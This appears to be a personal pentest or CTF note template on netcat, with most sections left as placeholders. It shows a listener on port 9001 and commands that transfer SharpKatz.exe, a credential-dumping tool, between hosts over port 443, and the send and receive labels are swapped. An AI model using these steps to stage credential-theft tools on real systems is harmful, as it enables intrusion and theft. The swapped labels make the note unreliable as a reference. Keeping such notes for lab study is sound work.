# netcat

_What this tool does and when I reach for it_

## Primary Use Cases

Main things I use this tool for

## Command Patterns

### Category 1

Open a listener on a specific port.
```bash
nc -nvlp 9001
```
^open-listener

Open a listener to receive a file
```bash
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```
^receive-file-over-tcp

Send a file to a listener
```bash
nc 192.168.49.128 443 > SharpKatz.exe
```
^send-file-over-tcp

## Personal Notes

- Things I learned from experience
- Common mistakes I made
- Environment-specific quirks

## CTF Examples

```dataview
TABLE file.name as "Box", choice(contains(file.tags, "easy"), "🟢", choice(contains(file.tags, "medium"), "🟡", "🔴")) as "Diff"
FROM "06-CTF-Writeups" AND #netcat
SORT file.ctime DESC
LIMIT 5
```

## Quick Links

- [[Primary-Technique]] - Main technique this supports
- [[Secondary-Technique]] - Other technique this supports

#netcat #tool